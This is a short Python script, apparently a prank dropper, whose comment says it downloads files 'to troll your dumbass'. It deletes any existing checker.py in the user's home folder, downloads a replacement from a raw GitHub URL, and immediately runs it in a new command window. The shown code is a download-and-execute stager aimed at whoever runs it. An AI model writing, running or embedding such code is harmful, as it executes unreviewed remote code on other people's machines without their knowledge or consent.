# Downloads and injects the files needed to troll your dumbass
def clone():
    import os, urllib.request, pathlib, subprocess
    dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/checker.py'
    home = os.path.expanduser("~")
    path = str(home) + '\checker.py'
    path = '{}'.format(path)
    try:
        os.remove(path)
    except FileNotFoundError:
        print('New System')
    urllib.request.urlretrieve(dlurl, '{}'.format(path))
    print('py '+ path)
    #subprocess.Popen(["py", "cmd", "/k", "{}".format(path)], shell = True)
    os.system("start /wait cmd /k {}".format('py ' + path))
    exit()

clone()